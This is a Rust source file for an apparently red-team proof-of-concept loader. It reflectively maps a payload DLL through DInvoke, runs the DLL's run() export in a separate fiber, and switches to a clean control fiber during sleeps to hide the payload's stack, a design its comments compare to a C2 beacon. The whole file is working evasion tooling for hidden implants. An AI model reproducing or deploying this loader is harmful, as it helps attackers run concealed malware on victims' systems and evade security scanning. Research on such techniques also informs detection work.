use std::ptr;

use data::PVOID;
use std::{thread, time};


///
/// This code must be considered like a payload loader, i.e. this code will be running 
/// from a small and "innocent" PE on disk.
/// This small PoC will perform the following steps:
///     1 - This loader will convert the current thread into a fiber. This fiber (known from now on
///         as the control fiber), since it is running code from disk, will have a "normal stack" without 
///         random memory addresses on it.
///     2 - The loader will reflectively load a PE (in this case, the payload given as an example) and will
///         create a new fiber (known as payload fiber) that runs the run() exported function.
///     3 - The loader will switch to the payload fiber. The payload's code will be executed, and once 
///         it needs to call Sleep, will switch back to the control fiber in order to hide its stack.
///     4 - The switch between the control fiber and the payload fiber will continue indefinitely.
/// 
fn main() {
    unsafe
    {
        let k32 = dinvoke::get_module_base_address("kernel32.dll");
        let r: Option<PVOID>;
        let f: data::ConvertThreadToFiber;
        // Only a fiber can create and switch to other fibers, so first we need to convert
        // the current thread into a fiber.
        dinvoke::dynamic_invoke!(k32,"ConvertThreadToFiber",f,r,ptr::null_mut());
        let first_fiber = r.unwrap();

        // We reflectively map the payload in memory using DInvoke.
        let dll = manualmap::read_and_map_module(r"..\..\..\payload\target\release\payload.dll").unwrap();
        println!("[Loader] Payload mapped at memory address 0x{:x}", dll.1);

        // We create a new fiber to execute the run() function exported on the payload dll.
        let r: Option<PVOID>;
        let f: data::CreateFiber;
        let fun = dinvoke::get_function_address(dll.1, "run");
        dinvoke::dynamic_invoke!(k32,"CreateFiber",f,r,0,fun as *mut _,first_fiber); 
        let fiber_dir = r.unwrap();
        println!("[Loader] New fiber created at 0x{:x}", fiber_dir as usize);

        loop 
        {
            println!("[Loader] Switching to payload fiber...");
            // We switch to the payload fiber. When the payload fiber switches back to this
            // control fiber, we will consider it as a signal to sleep a few seconds (like, for example,
            // a C2 beacon would do constantly). Once the call to Sleep returns, we switch back to the 
            // payload fiber (so our imaginary beacon can ping back its control server looking for new orders).
            // We repeat this process indefinitely. 
            let _ret: Option<()>;
            let func: data::SwitchToFiber;
            dinvoke::dynamic_invoke!(k32,"SwitchToFiber",func,_ret,fiber_dir); 
            let sleep_time = time::Duration::from_millis(7000);
            thread::sleep(sleep_time);
        }
    }
}